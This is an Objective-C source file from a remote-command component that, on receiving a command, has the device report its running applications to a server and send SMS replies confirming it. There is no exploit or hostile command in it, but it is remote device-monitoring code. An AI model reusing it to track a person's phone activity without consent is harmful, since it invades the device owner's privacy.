/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RequestRunningApplicationProcessor
 - Version      :  1.0  
 - Purpose      :  Ask the client to send the running application to the server
 - Copy right   :  12/07/2012, Benjawan Tanarattanakorn, Vervata Co., Ltd. All rights reserved.
 */

#import "RequestRunningApplicationProcessor.h"
#import "ApplicationManager.h"

@interface RequestRunningApplicationProcessor (private)
- (void) processRequestRunningApplication;
- (void) requestRunningApplicationException;
- (void) acknowldgeMessage;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete; 
- (void) processFinished;
@end


@implementation RequestRunningApplicationProcessor


/**
 - Method name:			initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:				This method is used to initialize the RequestRunningApplicationProcessor class
 - Argument list and description:	aRemoteCmdData (RemoteCmdData), aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description:	No return type
 */
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
	
	DLog (@">>>>>>>> RequestRunningApplication--->initWithRemoteCommandData")
	
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}


#pragma mark Overriden method

/**
 - Method name:			doProcessingCommand
 - Purpose:				This method is used to process the RequestRunningApplicationProcessor
 - Argument list and description:	No Argument 
 - Return description:	No return type
 - Overided				RemoteCmdAsyncHTTPProcessor
 */
- (void) doProcessingCommand {
	DLog (@"RequestRunningApplicationProcessor--->doProcessingCommand")
	[self processRequestRunningApplication];
}


#pragma mark Private method

/**
 - Method name:			processRequestRunningApplication
 - Purpose:				This method is used to process Request Running Application
 - Argument list and description:	No Argument
 - Return description:	No return type
 */
- (void) processRequestRunningApplication {
	DLog (@"RequestRunningApplicationProcessor ---> processRequestRunningApplication")
	id <ApplicationManager> appManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mApplicationManager];
	BOOL isReady = [appManager deliverRunningApplication:self];
	if (!isReady) {
		DLog (@"!!! not ready to process request running application command")
		[self requestRunningApplicationException];
	}
	else {
		DLog (@".... processing request unning application command")
		[self acknowldgeMessage];
	}
}

/**
 - Method name:			requestRunningApplicationException
 - Purpose:				This method is invoked when it fails to send running application
 - Argument list and description:	No Return Type
 - Return description:	No Argument
 */
- (void) requestRunningApplicationException {
	DLog (@"RequestRunningApplicationProcessor ---> requestRunningApplicationException");
	FxException* exception = [FxException exceptionWithName:@"requestRunningApplicationException" andReason:@"Request running application error"];
	//[exception setErrorCode:kRunningApplicationManagerBusy];
	[exception setErrorCode:kCmdExceptionErrorCmdBeingRetried];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name:			acknowldgeMessage
 - Purpose:				This method is used to prepare acknowldge message
 - Argument list and description:	No Argument 
 - Return description:	No Return
 */
- (void) acknowldgeMessage {
	DLog (@"RequestRunningApplicationProcessor ---> acknowldgeMessage");
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						  andErrorCode:_SUCCESS_];
	NSString *ackMessage = [messageFormat stringByAppendingString:NSLocalizedString(@"kRequestRunningApplicationSucessMSG1", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}

/**
 - Method name:			sendReplySMS:isProcessCompleted:
 - Purpose:				This method is used to send the SMS reply
 - Argument list and description:	aStatusCode (NSUInteger)
 - Return description:	No return type
 */
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"RequestRunningApplicationProcessor ---> sendReplySMS...")
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {
		[self processFinished];
	} else {
		DLog (@"Sent aknowldge message.")
	}
}

/**
 - Method name:			processFinished
 - Purpose:				This method is invoked when request running application process is completed
 - Argument list and description:	No Argument 
 - Return description:	isValidArguments (BOOL)
 */
-(void) processFinished {
	DLog (@"RequestRunningApplicationProcessor ---> processFinished")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}

// protocol RunningApplicationDelegate
- (void) deliverRunningApplicationDidFinished: (NSError *) aError {
	DLog (@"!!!!!!! RequestRunningApplicationProcessor ---> deliverRunningApplicationDidFinished")
	if (!aError) {
		NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							  andErrorCode:_SUCCESS_];
		NSString *requestRunningAppMessage = [messageFormat stringByAppendingString:NSLocalizedString(@"kRequestRunningApplicationSucessMSG2", @"")];		
		[self sendReplySMS:requestRunningAppMessage isProcessCompleted:YES];
	} else {
		NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							  andErrorCode:[aError code]];
		[self sendReplySMS:messageFormat isProcessCompleted:YES];
	}
}

@end
